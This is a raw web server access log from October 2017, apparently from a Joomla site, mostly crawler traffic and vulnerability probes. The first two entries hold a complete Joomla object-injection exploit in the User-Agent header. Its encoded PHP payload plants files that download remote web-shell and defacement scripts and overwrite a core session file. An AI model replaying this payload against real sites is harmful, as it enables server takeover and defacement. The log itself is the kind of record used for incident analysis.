74.208.41.47 - - [19/Oct/2017:21:49:22 +0300] "GET / HTTP/1.1" 400 37 "-" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:2934:\x22eval(base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3hheC5waHAiIDsKJGZwPWZvcGVuKCIkY2hlY2siLCJ3KyIpOwpmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFLWm5WdVkzUnBiMjRnYUhSMGNGOW5aWFFvSkhWeWJDbDdDZ2trYVcwZ1BTQmpkWEpzWDJsdWFYUW9KSFZ5YkNrN0NnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93b0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwTlBUazVGUTFSVVNVMUZUMVZVTENBeE1DazdDZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZSazlNVEU5WFRFOURRVlJKVDA0c0lERXBPd29KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYMGhGUVVSRlVpd2dNQ2s3Q2dseVpYUjFjbTRnWTNWeWJGOWxlR1ZqS0NScGJTazdDZ2xqZFhKc1gyTnNiM05sS0NScGJTazdDbjBLSkdOb1pXTnJJRDBnSkY5VFJWSldSVkpiSjBSUFExVk5SVTVVWDFKUFQxUW5YU0F1SUNJdmRHMXdMM1pwY0M1d2FIQWlJRHNLSkhSbGVIUWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNEb3ZMMnQ1YkdWaWRXWnBjeTVqYjIwdmRtbHdMM1pwY0M1MGVIUW5LVHNLSkc5d1pXNGdQU0JtYjNCbGJpZ2tZMmhsWTJzc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNCbGJpd2dKSFJsZUhRcE93cG1ZMnh2YzJVb0pHOXdaVzRwT3dwcFppaG1hV3hsWDJWNGFYTjBjeWdrWTJobFkyc3BLWHNLSUNBZ0lHVmphRzhnSkdOb1pXTnJMaUk4TDJKeVBpSTdDbjFsYkhObElBb2dJR1ZqYUc4Z0ltNXZkQ0JsZUdsMGN5STdDbVZqYUc4Z0ltUnZibVVnTGx4dUlDSWdPd29rWTJobFkyc3lJRDBnSkY5VFJWSldSVkpiSjBSUFExVk5SVTVVWDFKUFQxUW5YU0F1SUNJdmRHMXdMM1Z3ZUhndWNHaHdJaUE3Q2lSMFpYaDBNaUE5SUdoMGRIQmZaMlYwS0Nkb2RIUndPaTh2YTNsc1pXSjFabWx6TG1OdmJTOTJhWEF2ZFhCc2IyRmtaWEl1ZEhoMEp5azdDaVJ2Y0dWdU1pQTlJR1p2Y0dWdUtDUmphR1ZqYXpJc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdDbVpqYkc5elpTZ2tiM0JsYmpJcE93cHBaaWhtYVd4bFgyVjRhWE4wY3lna1kyaGxZMnN5S1NsN0NpQWdJQ0JsWTJodklDUmphR1ZqYXpJdUlqd3ZZbkkrSWpzS2ZXVnNjMlVnQ2lBZ1pXTm9ieUFpYm05MElHVjRhWFJ6TWlJN0NtVmphRzhnSW1SdmJtVXlJQzVjYmlBaUlEc0tDaVJqYUdWamF6TTlKRjlUUlZKV1JWSmJKMFJQUTFWTlJVNVVYMUpQVDFRblhTQXVJQ0l2ZUM1MGVIUWlJRHNLSkhSbGVIUXpJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQTZMeTlyZVd4bFluVm1hWE11WTI5dEwzWnBjQzlrWldaaFkyVXVkSGgwSnlrN0NpUnZjRE05Wm05d1pXNG9KR05vWldOck15d2dKM2NuS1RzS1puZHlhWFJsS0NSdmNETXNKSFJsZUhRektUc0tabU5zYjNObEtDUnZjRE1wT3dvS0pHTm9aV05yTkQwa1gxTkZVbFpGVWxzblJFOURWVTFGVGxSZlVrOVBWQ2RkSUM0Z0lpOTBiWEF2WTJobFkyc3VjR2h3SWlBN0NpUjBaWGgwTkNBOUlHaDBkSEJmWjJWMEtDZG9kSFJ3T2k4dmEzbHNaV0oxWm1sekxtTnZiUzkyYVhBdlkyaGxZMnN1ZEhoMEp5azdDaVJ2Y0RROVptOXdaVzRvSkdOb1pXTnJOQ3dnSjNjbktUc0tabmR5YVhSbEtDUnZjRFFzSkhSbGVIUTBLVHNLWm1Oc2IzTmxLQ1J2Y0RRcE93b0tKR05vWldOck5UMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTk0TG5Cb2NDSWdPd29rZEdWNGREVWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNEb3ZMMnQ1YkdWaWRXWnBjeTVqYjIwdmRtbHdMMlJsWm1GalpTNTBlSFFuS1RzS0pHOXdOVDFtYjNCbGJpZ2tZMmhsWTJzMUxDQW5keWNwT3dwbWQzSnBkR1VvSkc5d05Td2tkR1Y0ZERVcE93cG1ZMnh2YzJVb0pHOXdOU2s3Q2dva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdmMyVnpjMmx2Ymk5elpYTnphVzl1TG5Cb2NDSWdPd29rZEdWNGREWWdQU0JvZEhSd1gyZGxkQ2duSXljcE93b2tiM0EyUFdadmNHVnVLQ1JqYUdWamF6WXNJQ2QzSnlrN0NtWjNjbWwwWlNna2IzQTJMQ1IwWlhoME5pazdDbVpqYkc5elpTZ2tiM0EyS1RzS0NncEFkVzVzYVc1cktGOWZSa2xNUlY5ZktUc0tDZ28vUGc9PScpKTsKZmNsb3NlKCRmcCk7'));JFactory::getConfig();exit\x22;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:5:\x22cache\x22;b:1;s:11:\x22cache_class\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;b:1;}\xF0\xFD\xFD\xFD"
74.208.41.47 - - [19/Oct/2017:21:49:22 +0300] "GET / HTTP/1.1" 400 37 "-" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:2934:\x22eval(base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3hheC5waHAiIDsKJGZwPWZvcGVuKCIkY2hlY2siLCJ3KyIpOwpmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFLWm5WdVkzUnBiMjRnYUhSMGNGOW5aWFFvSkhWeWJDbDdDZ2trYVcwZ1BTQmpkWEpzWDJsdWFYUW9KSFZ5YkNrN0NnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93b0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwTlBUazVGUTFSVVNVMUZUMVZVTENBeE1DazdDZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZSazlNVEU5WFRFOURRVlJKVDA0c0lERXBPd29KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYMGhGUVVSRlVpd2dNQ2s3Q2dseVpYUjFjbTRnWTNWeWJGOWxlR1ZqS0NScGJTazdDZ2xqZFhKc1gyTnNiM05sS0NScGJTazdDbjBLSkdOb1pXTnJJRDBnSkY5VFJWSldSVkpiSjBSUFExVk5SVTVVWDFKUFQxUW5YU0F1SUNJdmRHMXdMM1pwY0M1d2FIQWlJRHNLSkhSbGVIUWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNEb3ZMMnQ1YkdWaWRXWnBjeTVqYjIwdmRtbHdMM1pwY0M1MGVIUW5LVHNLSkc5d1pXNGdQU0JtYjNCbGJpZ2tZMmhsWTJzc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNCbGJpd2dKSFJsZUhRcE93cG1ZMnh2YzJVb0pHOXdaVzRwT3dwcFppaG1hV3hsWDJWNGFYTjBjeWdrWTJobFkyc3BLWHNLSUNBZ0lHVmphRzhnSkdOb1pXTnJMaUk4TDJKeVBpSTdDbjFsYkhObElBb2dJR1ZqYUc4Z0ltNXZkQ0JsZUdsMGN5STdDbVZqYUc4Z0ltUnZibVVnTGx4dUlDSWdPd29rWTJobFkyc3lJRDBnSkY5VFJWSldSVkpiSjBSUFExVk5SVTVVWDFKUFQxUW5YU0F1SUNJdmRHMXdMM1Z3ZUhndWNHaHdJaUE3Q2lSMFpYaDBNaUE5SUdoMGRIQmZaMlYwS0Nkb2RIUndPaTh2YTNsc1pXSjFabWx6TG1OdmJTOTJhWEF2ZFhCc2IyRmtaWEl1ZEhoMEp5azdDaVJ2Y0dWdU1pQTlJR1p2Y0dWdUtDUmphR1ZqYXpJc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdDbVpqYkc5elpTZ2tiM0JsYmpJcE93cHBaaWhtYVd4bFgyVjRhWE4wY3lna1kyaGxZMnN5S1NsN0NpQWdJQ0JsWTJodklDUmphR1ZqYXpJdUlqd3ZZbkkrSWpzS2ZXVnNjMlVnQ2lBZ1pXTm9ieUFpYm05MElHVjRhWFJ6TWlJN0NtVmphRzhnSW1SdmJtVXlJQzVjYmlBaUlEc0tDaVJqYUdWamF6TTlKRjlUUlZKV1JWSmJKMFJQUTFWTlJVNVVYMUpQVDFRblhTQXVJQ0l2ZUM1MGVIUWlJRHNLSkhSbGVIUXpJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQTZMeTlyZVd4bFluVm1hWE11WTI5dEwzWnBjQzlrWldaaFkyVXVkSGgwSnlrN0NpUnZjRE05Wm05d1pXNG9KR05vWldOck15d2dKM2NuS1RzS1puZHlhWFJsS0NSdmNETXNKSFJsZUhRektUc0tabU5zYjNObEtDUnZjRE1wT3dvS0pHTm9aV05yTkQwa1gxTkZVbFpGVWxzblJFOURWVTFGVGxSZlVrOVBWQ2RkSUM0Z0lpOTBiWEF2WTJobFkyc3VjR2h3SWlBN0NpUjBaWGgwTkNBOUlHaDBkSEJmWjJWMEtDZG9kSFJ3T2k4dmEzbHNaV0oxWm1sekxtTnZiUzkyYVhBdlkyaGxZMnN1ZEhoMEp5azdDaVJ2Y0RROVptOXdaVzRvSkdOb1pXTnJOQ3dnSjNjbktUc0tabmR5YVhSbEtDUnZjRFFzSkhSbGVIUTBLVHNLWm1Oc2IzTmxLQ1J2Y0RRcE93b0tKR05vWldOck5UMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTk0TG5Cb2NDSWdPd29rZEdWNGREVWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNEb3ZMMnQ1YkdWaWRXWnBjeTVqYjIwdmRtbHdMMlJsWm1GalpTNTBlSFFuS1RzS0pHOXdOVDFtYjNCbGJpZ2tZMmhsWTJzMUxDQW5keWNwT3dwbWQzSnBkR1VvSkc5d05Td2tkR1Y0ZERVcE93cG1ZMnh2YzJVb0pHOXdOU2s3Q2dva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdmMyVnpjMmx2Ymk5elpYTnphVzl1TG5Cb2NDSWdPd29rZEdWNGREWWdQU0JvZEhSd1gyZGxkQ2duSXljcE93b2tiM0EyUFdadmNHVnVLQ1JqYUdWamF6WXNJQ2QzSnlrN0NtWjNjbWwwWlNna2IzQTJMQ1IwWlhoME5pazdDbVpqYkc5elpTZ2tiM0EyS1RzS0NncEFkVzVzYVc1cktGOWZSa2xNUlY5ZktUc0tDZ28vUGc9PScpKTsKZmNsb3NlKCRmcCk7'));JFactory::getConfig();exit\x22;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:5:\x22cache\x22;b:1;s:11:\x22cache_class\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;b:1;}\xF0\xFD\xFD\xFD"
193.169.52.154 - - [19/Oct/2017:21:52:14 +0300] "GET / HTTP/1.1" 200 738 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.132 Safari/537.36"
95.108.129.196 - - [19/Oct/2017:22:17:15 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)"
91.189.112.7 - - [19/Oct/2017:22:21:45 +0300] "GET / HTTP/1.1" 200 1948 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
95.108.129.196 - - [19/Oct/2017:22:48:29 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)"
52.41.211.72 - - [19/Oct/2017:22:49:00 +0300] "GET / HTTP/1.1" 400 37 "http://www.google.com/search?hl=fr&q=dictionary+english" "Magic Browser"
52.41.211.72 - - [19/Oct/2017:22:49:01 +0300] "GET / HTTP/1.1" 400 37 "-" "Magic Browser"
163.172.255.19 - - [19/Oct/2017:22:49:10 +0300] "GET /administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php HTTP/1.1" 400 37 "http://ai-forecasts.com/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
42.236.99.51 - - [19/Oct/2017:22:51:53 +0300] "GET / HTTP/1.1" 400 37 "http://bi-grouplabs.ru/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.51 - - [19/Oct/2017:22:51:54 +0300] "GET / HTTP/1.1" 400 37 "http://www.bi-grouplabs.ru/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
157.55.39.21 - - [19/Oct/2017:22:53:59 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.26 - - [19/Oct/2017:22:54:05 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.139 - - [19/Oct/2017:23:06:54 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
178.154.224.71 - - [19/Oct/2017:23:39:37 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01f.yandex.ru)"
202.46.49.208 - - [19/Oct/2017:23:40:14 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
178.154.224.71 - - [19/Oct/2017:23:40:54 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01f.yandex.ru)"
94.244.138.21 - - [19/Oct/2017:23:44:31 +0300] "GET http://web-dengi.net/HttpRequest/checkPoxy.ashx?ip=37.46.131.12&port=80 HTTP/1.1" 400 37 "-" "-"
91.250.39.226 - - [19/Oct/2017:23:57:04 +0300] "GET /administrator/index.php HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 6.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
104.193.88.244 - - [20/Oct/2017:00:13:35 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
94.181.45.166 - - [20/Oct/2017:00:14:08 +0300] "HEAD / HTTP/1.1" 400 0 "-" "Opera/8.92 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.38)"
95.108.129.196 - - [20/Oct/2017:00:18:28 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)"
217.69.143.217 - - [20/Oct/2017:00:25:03 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"
217.69.143.217 - - [20/Oct/2017:00:25:03 +0300] "GET /favicon.ico HTTP/1.1" 400 37 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"
217.69.143.217 - - [20/Oct/2017:00:25:03 +0300] "GET /favicon.png HTTP/1.1" 400 37 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.9.118.28 - - [20/Oct/2017:00:40:46 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01i.yandex.ru)"
31.130.18.58 - - [20/Oct/2017:00:42:03 +0300] "GET /seminars/ HTTP/1.0" 400 26 "http://www.bi-grouplabs.ru/seminars/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857"
31.130.18.58 - - [20/Oct/2017:00:42:04 +0300] "GET / HTTP/1.0" 400 26 "http://forum.bi-grouplabs.ru/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857"
111.56.5.42 - - [20/Oct/2017:00:42:27 +0300] "GET /seminars/ HTTP/1.0" 400 26 "http://forum.bi-grouplabs.ru/seminars/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857"
91.250.39.226 - - [20/Oct/2017:00:54:54 +0300] "GET /administrator/index.php HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 6.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
194.58.115.168 - - [20/Oct/2017:01:03:15 +0300] "GET / HTTP/1.1" 400 37 "-" "Virusdie crawler/3.0"
37.9.118.28 - - [20/Oct/2017:01:18:47 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01i.yandex.ru)"
94.181.45.166 - - [20/Oct/2017:01:21:33 +0300] "HEAD / HTTP/1.1" 400 0 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)"
191.96.249.184 - - [20/Oct/2017:01:32:39 +0300] "GET / HTTP/1.1" 200 1948 "-" "-"
42.236.99.86 - - [20/Oct/2017:01:34:54 +0300] "GET / HTTP/1.1" 400 37 "http://www.high-tech.su/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.86 - - [20/Oct/2017:01:34:54 +0300] "GET / HTTP/1.1" 400 37 "http://high-tech.su/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
109.236.81.168 - - [20/Oct/2017:01:43:54 +0300] "GET /ozsybry/skachat_vzlom_vormiksa_9374_0.jpg HTTP/1.1" 400 37 "http://intimpjatigorsk.weebly.com/blog/spravochnik-po-normirovaniiu-truda" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.39"
109.236.81.168 - - [20/Oct/2017:01:44:15 +0300] "GET /ozsybry/skachat_vzlom_vormiksa_9374_0.jpg HTTP/1.1" 400 37 "http://intimpjatigorsk.weebly.com/blog/spravochnik-po-normirovaniiu-truda" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.39"
109.236.81.168 - - [20/Oct/2017:01:44:18 +0300] "GET /ozsybry/skachat_vzlom_vormiksa_9374_0.jpg HTTP/1.1" 400 37 "http://intimpjatigorsk.weebly.com/blog/spravochnik-po-normirovaniiu-truda" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.39"
207.46.13.33 - - [20/Oct/2017:02:12:52 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
178.154.224.71 - - [20/Oct/2017:02:20:56 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01f.yandex.ru)"
157.55.39.133 - - [20/Oct/2017:02:55:43 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.33 - - [20/Oct/2017:02:56:13 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
37.9.118.28 - - [20/Oct/2017:03:00:35 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01i.yandex.ru)"
157.55.39.8 - - [20/Oct/2017:04:13:07 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.33 - - [20/Oct/2017:04:13:30 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.200.190.149 - - [20/Oct/2017:04:15:15 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
45.55.4.47 - - [20/Oct/2017:04:20:00 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 zgrab/0.x"
89.234.68.103 - - [20/Oct/2017:04:25:24 +0300] "GET / HTTP/1.1" 400 37 "-" "Wget/1.15 (linux-gnu)"
176.9.58.227 - - [20/Oct/2017:04:27:23 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
138.201.255.45 - - [20/Oct/2017:04:29:35 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
138.201.255.45 - - [20/Oct/2017:04:29:35 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
138.201.255.45 - - [20/Oct/2017:04:31:01 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
138.201.255.45 - - [20/Oct/2017:04:31:02 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
95.108.129.196 - - [20/Oct/2017:04:34:02 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)"
45.55.1.22 - - [20/Oct/2017:04:43:10 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 zgrab/0.x"
195.238.108.89 - - [20/Oct/2017:04:56:59 +0300] "GET /component/user/remind.html HTTP/1.0" 400 26 "http://high-tech.su/component/user/remind.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
195.238.108.89 - - [20/Oct/2017:04:57:00 +0300] "GET / HTTP/1.0" 400 26 "http://forum.high-tech.su/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
95.108.129.196 - - [20/Oct/2017:05:06:08 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)"
195.238.108.89 - - [20/Oct/2017:05:06:36 +0300] "GET /index.php/component/user/login HTTP/1.0" 400 26 "http://www.bi-grouplabs.ru/index.php/component/user/login" "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0"
111.56.5.42 - - [20/Oct/2017:05:06:37 +0300] "GET /index.php/component/user/login HTTP/1.0" 400 26 "http://www.bi-grouplabs.ru/index.php/component/user/login" "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0"
195.238.108.89 - - [20/Oct/2017:05:06:38 +0300] "GET / HTTP/1.0" 400 26 "http://forum.bi-grouplabs.ru/" "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0"
180.76.15.26 - - [20/Oct/2017:05:12:50 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.137 - - [20/Oct/2017:05:12:50 +0300] "GET /robots.txt HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
51.255.65.87 - - [20/Oct/2017:05:12:51 +0300] "GET /web-links/2-robotics-links.feed?type=rss HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
180.76.15.137 - - [20/Oct/2017:05:15:22 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
193.169.52.154 - - [20/Oct/2017:05:25:18 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.132 Safari/537.36"
178.154.224.71 - - [20/Oct/2017:05:43:24 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01f.yandex.ru)"
157.55.39.112 - - [20/Oct/2017:05:43:29 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.109.172.41 - - [20/Oct/2017:05:48:08 +0300] "GET / HTTP/1.1" 400 37 "-" "-"
114.109.172.41 - - [20/Oct/2017:05:48:09 +0300] "POST /command.php HTTP/1.1" 400 37 "-" "-"
202.46.53.116 - - [20/Oct/2017:05:48:42 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
178.154.224.71 - - [20/Oct/2017:05:54:33 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01f.yandex.ru)"
103.78.132.3 - - [20/Oct/2017:06:21:32 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 zgrab/0.x"
104.193.88.243 - - [20/Oct/2017:06:22:02 +0300] "GET / HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
91.250.39.226 - - [20/Oct/2017:06:26:58 +0300] "GET /administrator/index.php HTTP/1.1" 400 37 "-" "Mozilla/5.0 (Windows NT 6.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
